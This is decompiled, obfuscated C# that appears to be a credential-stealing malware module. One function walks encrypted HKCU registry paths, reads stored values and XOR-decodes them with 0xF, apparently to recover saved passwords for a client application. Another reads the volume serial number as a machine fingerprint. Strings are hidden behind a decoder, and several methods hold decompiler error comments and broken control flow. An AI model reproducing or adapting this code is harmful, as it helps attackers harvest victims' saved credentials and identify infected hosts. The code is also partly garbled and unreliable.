using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.CompilerServices;
using System.Runtime.ConstrainedExecution;
using System.Runtime.InteropServices;
using System.Security;
using System.Text;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using My;

[StandardModule]
internal sealed class S_
{
	public class VC
	{
		public class SafeKeyHandle : SafeHandle
		{
			public override bool IsInvalid
			{
				get
				{
					return handle == IntPtr.Zero;
				}
			}

			public SafeKeyHandle()
				: base(IntPtr.Zero, true)
			{
			}

			protected override bool ReleaseHandle()
			{
				return NativeMethods.RegCloseKey(handle) == 0;
			}
		}

		[SuppressUnmanagedCodeSecurity]
		public class NativeMethods
		{
			[DllImport("Advapi32", CharSet = CharSet.Unicode, SetLastError = true)]
			[ReliabilityContract(Consistency.WillNotCorruptState, Cer.MayFail)]
			public static extern int RegOpenKeyEx([In] IntPtr hKey, [In] string subKey, int options, [In] int samDesired, out SafeKeyHandle phkResult);

			[DllImport("Advapi32", SetLastError = true)]
			[ReliabilityContract(Consistency.WillNotCorruptState, Cer.Success)]
			public static extern int RegCloseKey(IntPtr hKey);

			[DllImport("Advapi32", CharSet = CharSet.Unicode, SetLastError = true)]
			public static extern int RegQueryValueEx([In] SafeKeyHandle hKey, [In] string lpValueName, int reserved, out int type, [Out] byte[] data, [In][Out] ref int dataSize);
		}

		public static object LP()
		{
			List<JK> list = new List<JK>();
			string text = O.I("+UtVdHr7daksMHxeBY/JQc5A5ciOsmchTKYAMaDB7/CCsB0mI7nGqh/tSbdYNDqC");
			IntPtr hKey = new IntPtr(-2147483647);
			checked
			{
				try
				{
					RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(text);
					if (registryKey.GetSubKeyNames().Length != 0)
					{
						string[] subKeyNames = registryKey.GetSubKeyNames();
						foreach (string text2 in subKeyNames)
						{
							RegistryKey registryKey2 = registryKey.OpenSubKey(text2);
							SafeKeyHandle phkResult = null;
							int num = NativeMethods.RegOpenKeyEx(hKey, text + text2, 0, 131097, out phkResult);
							byte[] array = new byte[257];
							byte[] array2 = new byte[257];
							SafeKeyHandle hKey2 = phkResult;
							string lpValueName = O.I("B6UJuSMiPSa02PYTuv9Jcg==");
							int type = 0;
							byte[] data = array;
							int dataSize = 256;
							num = NativeMethods.RegQueryValueEx(hKey2, lpValueName, 0, out type, data, ref dataSize);
							SafeKeyHandle hKey3 = phkResult;
							string lpValueName2 = O.I("dbk35eXeDBEgCDThfmaWng==");
							dataSize = 0;
							type = 256;
							num = NativeMethods.RegQueryValueEx(hKey3, lpValueName2, 0, out dataSize, array2, ref type);
							JK jK = new JK();
							jK.WE_114 = text2;
							int num2 = 0;
							int num3 = array.Length - 1;
							for (int j = 0; j <= num3 && array[j] != 0; j++)
							{
								num2++;
							}
							array = (byte[])Utils.CopyArray(array, new byte[num2 - 1 + 1]);
							jK.ECS_112 = Encoding.Default.GetString(array);
							num2 = 0;
							string text3 = null;
							int num4 = array2.Length - 1;
							for (int k = 0; k <= num4 && array2[k] != 0; k++)
							{
								text3 += Conversions.ToString(Strings.ChrW(array2[k] ^ 0xF));
							}
							jK.GA_113 = text3;
							jK.NP_115 = O.I("04/0lumVJP+/5vvCQX5dwtZ5Lnv0YHjf3RWXYwpr6EM=");
							list.Add(jK);
						}
						return list;
					}
					return list;
				}
				catch (Exception ex)
				{
					ProjectData.SetProjectError(ex);
					Exception ex2 = ex;
					ProjectData.ClearProjectError();
					return list;
				}
			}
		}
	}

	[DllImport("kernel32", CharSet = CharSet.Ansi, EntryPoint = "GetVolumeInformationA", ExactSpelling = true, SetLastError = true)]
	private static extern int UIJ([MarshalAs(UnmanagedType.VBByRefStr)] ref string KHP_311, [MarshalAs(UnmanagedType.VBByRefStr)] ref string QXA_312, int EZ_313, ref int ZU_314, ref int PJ_315, ref int PHV_316, [MarshalAs(UnmanagedType.VBByRefStr)] ref string HBA_317, int UVN_318);

	public static string NTZ()
	{
		//Discarded unreachable code: IL_005a, IL_006d
		//IL_0064: Expected O, but got I4
		try
		{
			string KHP_ = Interaction.Environ(O.I("e370YubJ9+XbFfZjMSxbBg==")) + O.I("FtO3o9x/w+Ole8I84aAzLw==");
			string QXA_ = null;
			int PJ_ = 0;
			int PHV_ = 0;
			string HBA_ = null;
			int ZU_ = default(int);
			UIJ(ref KHP_, ref QXA_, 0, ref ZU_, ref PJ_, ref PHV_, ref HBA_, 0);
			return Conversion.Hex(ZU_);
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			string result = null;
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static string TG(string KH_319)
	{
		//Discarded unreachable code: IL_0022, IL_0040, IL_0042, IL_0053, IL_0075, IL_008a, IL_009d
		//IL_0094: Expected O, but got I4
		//IL_0095: Expected O, but got I4
		int num = default(int);
		string result;
		int num3 = default(int);
		try
		{
			ProjectData.ClearProjectError();
			num = 1;
			int num2 = 2;
			StreamReader streamReader = new StreamReader(KH_319);
			num2 = 3;
			result = streamReader.ReadToEnd().ToString();
		}
		catch (object obj) when (obj is Exception && num != 0 && num3 == 0)
		{
			ProjectData.SetProjectError((Exception)obj);
			/*Error near IL_0073: Could not find block for branch target IL_0042*/;
		}
		if (num3 != 0)
		{
			ProjectData.ClearProjectError();
		}
		return result;
	}

	public static string RU(string RW__320, string DIV_321, string OU_322)
	{
		//Discarded unreachable code: IL_0035, IL_0048
		//IL_003f: Expected O, but got I4
		//IL_0040: Expected O, but got I4
		try
		{
			string[] array = Strings.Split(RW__320, DIV_321);
			string[] array2 = Strings.Split(array[1], OU_322);
			return array2[0];
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string result = O.I("RUGxhrPcJABENukecMppew==");
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static string DD(string CAG_323)
	{
		//Discarded unreachable code: IL_0086, IL_00a6, IL_00a8, IL_00bb, IL_00df, IL_00f5, IL_0108
		//IL_00ff: Expected O, but got I4
		//IL_0100: Expected O, but got I4
		int num2 = default(int);
		string result;
		int num3 = default(int);
		try
		{
			int num = 1;
			object objectValue = RuntimeHelpers.GetObjectValue(Interaction.CreateObject(O.I("7cUT2ztMdtc/tR7lMGy3/Q==")));
			ProjectData.ClearProjectError();
			num2 = 1;
			num = 3;
			string memberName = O.I("z5827sgITufWLaWsNfXraQ==");
			object[] array = new object[1]
			{
				CAG_323
			};
			bool[] array2 = new bool[1]
			{
				true
			};
			object value = NewLateBinding.LateGet(objectValue, null, memberName, array, null, null, array2);
			if (array2[0])
			{
				CAG_323 = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[0]), typeof(string));
			}
			result = Conversions.ToString(value);
		}
		catch (object obj) when (obj is Exception && num2 != 0 && num3 == 0)
		{
			ProjectData.SetProjectError((Exception)obj);
			/*Error near IL_00dd: Could not find block for branch target IL_00a8*/;
		}
		if (num3 != 0)
		{
			ProjectData.ClearProjectError();
		}
		return result;
	}

	public static string OME(string GL_324, int DF_325)
	{
		//Discarded unreachable code: IL_0062, IL_0075
		//IL_006c: Expected O, but got I4
		//IL_006d: Expected O, but got I4
		checked
		{
			try
			{
				string[] array = W.F_4.FileSystem.ReadAllText(GL_324, Encoding.Default).Split('\r');
				if (DF_325 > 0)
				{
					return array[DF_325 - 1];
				}
				if (DF_325 < 0)
				{
					return array[array.Length + DF_325 - 1];
				}
				return "";
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				string result = "";
				ProjectData.ClearProjectError();
				return result;
			}
		}
	}
}
